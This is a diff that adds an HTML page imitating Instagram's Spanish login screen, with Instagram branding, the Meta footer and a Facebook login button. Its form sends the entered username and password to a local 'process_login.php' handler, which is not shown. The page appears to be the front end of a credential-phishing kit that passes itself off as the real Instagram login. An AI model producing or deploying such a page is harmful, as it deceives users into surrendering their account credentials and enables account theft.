@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+	
+	    <style>
+        .spacer {
+            height: 50px; /* altura del espacio vacío */
+            /* otros estilos si es necesario */
+        }
+		
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+		    <div class="spacer"></div>
+            <img src="logoig.png" alt="Imagen" class="login-image" style="width:250px; height:100px;">
+            <form action="process_login.php" method="POST">
+                <input type="text" placeholder="Teléfono, usuario o correo electrónico" name="usuario" required>
+                <input type="password" placeholder="Contraseña" name="contrasena" required>
+                <button type="submit" class="btn-enter">Entrar</button>
+            </form>
+            <div class="divider">
+                <span>o</span>
+            </div>
+            <button class="btn-facebook">
+                <img src="logo_facebook.png" alt="Facebook Logo" class="facebook-logo">
+                Iniciar con Facebook
+            </button>
+            <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+        </div>
+        <div class="register-box">
+            <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
+        </div>
+        <div class="download-app">
+            <span>Descarga la aplicación.</span>
+            <div class="app-icons">
+                <img src="app_store.png" alt="App Store" class="app-icon">
+                <img src="google_play.png" alt="Google Play" class="app-icon">
+            </div>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li>Meta</li>
+            <li>Información</li>
+            <li>Blog</li>
+            <li>Empleo</li>
+            <li>Ayuda</li>
+            <li>API</li>
+            <li>Privacidad</li>
+            <li>Configuración de cookies</li>
+            <li>Condiciones</li>
+            <li>Ubicaciones</li>
+            <li>Instagram Lite</li>
+            <li>Threads</li>
+            <li>Subir contactos y personas no usuarias</li>
+            <li>Meta Verified</li>
+        </ul>
+        <p>Español (España)</p>
+        <p>© 2024 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
